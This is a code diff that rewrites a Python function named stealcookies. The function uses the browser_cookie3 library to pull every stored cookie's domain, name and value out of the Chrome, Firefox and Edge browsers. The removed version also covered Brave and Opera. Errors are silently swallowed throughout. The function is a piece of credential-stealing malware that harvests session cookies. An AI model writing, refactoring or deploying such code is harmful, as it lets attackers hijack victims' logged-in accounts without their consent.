@@ -1,27 +1,40 @@
 def stealcookies():
     cookies = []
     
-    browser_functions = [
-        ('Chrome', browser_cookie3.chrome),
-        ('Firefox', browser_cookie3.firefox),
-        ('Edge', browser_cookie3.edge),
-        ('Brave', browser_cookie3.brave),
-        ('Opera', browser_cookie3.opera)
-    ]
+    try:
+        chrome_cookies = browser_cookie3.chrome()
+        for cookie in chrome_cookies:
+            cookies.append({
+                'browser': 'Chrome',
+                'domain': cookie.domain,
+                'name': cookie.name,
+                'value': cookie.value
+            })
+    except:
+        pass
     
-    for browser_name, cookie_func in browser_functions:
-        try:
-            browser_cookies = cookie_func(domain_name='')
-            for cookie in browser_cookies:
-                cookies.append({
-                    'browser': browser_name,
-                    'domain': cookie.domain,
-                    'name': cookie.name,
-                    'value': cookie.value,
-                    'expires': cookie.expires,
-                    'secure': cookie.secure
-                })
-        except:
-            continue
+    try:
+        firefox_cookies = browser_cookie3.firefox()
+        for cookie in firefox_cookies:
+            cookies.append({
+                'browser': 'Firefox',
+                'domain': cookie.domain,
+                'name': cookie.name,
+                'value': cookie.value
+            })
+    except:
+        pass
+    
+    try:
+        edge_cookies = browser_cookie3.edge()
+        for cookie in edge_cookies:
+            cookies.append({
+                'browser': 'Edge',
+                'domain': cookie.domain,
+                'name': cookie.name,
+                'value': cookie.value
+            })
+    except:
+        pass
     
     return cookies
